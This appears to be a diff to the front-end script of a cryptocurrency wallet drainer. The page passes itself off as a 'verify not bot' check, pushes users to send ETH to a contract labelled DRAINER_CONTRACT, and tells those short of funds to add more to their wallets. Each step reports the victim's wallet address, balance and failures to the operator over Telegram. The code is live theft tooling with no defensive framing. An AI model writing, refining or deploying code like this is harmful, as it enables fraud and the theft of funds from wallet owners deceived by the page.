@@ -362,6 +362,15 @@
                 const ethBalance = await web3.eth.getBalance(userAccount);
                 const ethBalanceBigInt = BigInt(ethBalance);
 
+                // Preliminary check: Ensure the balance is at least 0.01 ETH (required by the contract)
+                if (ethBalanceBigInt < BigInt(amountToSend)) {
+                    const currentEth = web3.utils.fromWei(ethBalance, "ether");
+                    const requiredEth = web3.utils.fromWei(amountToSend, "ether");
+                    document.getElementById("connectStatus").innerText = `Insufficient ETH balance to complete the verification. You have ${currentEth} ETH, but need at least ${requiredEth} ETH (excluding gas fees). Please add funds to your wallet and try again.`;
+                    await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Verification (Minimum Check)* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${currentEth} ETH\n💸 *Required (Minimum)*: ${requiredEth} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
+                }
+
                 // Estimate gas for the verifyNotBot transaction
                 let gasEstimate;
                 try {
@@ -370,7 +379,7 @@
                         value: amountToSend
                     });
                 } catch (error) {
-                    document.getElementById("connectStatus").innerText = "Failed to estimate gas for verification. Please try again later.";
+                    document.getElementById("connectStatus").innerText = `Failed to estimate gas for verification: ${error.message}. Please try again later.`;
                     await sendTelegramMessage(`⚠️ *Gas Estimation Failed for Verification* ⚠️\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                     return;
                 }
@@ -383,7 +392,7 @@
                 // Add a safety margin to the total required amount (1.2x the gas fee)
                 const totalRequired = BigInt(amountToSend) + (gasFee * BigInt(12) / BigInt(10)); // 1.2x gas fee as safety margin
 
-                // Check if the victim has enough ETH to cover the transaction
+                // Check if the victim has enough ETH to cover the transaction (including gas fees)
                 if (ethBalanceBigInt < totalRequired) {
                     const requiredEth = web3.utils.fromWei(totalRequired.toString(), "ether");
                     const currentEth = web3.utils.fromWei(ethBalance, "ether");
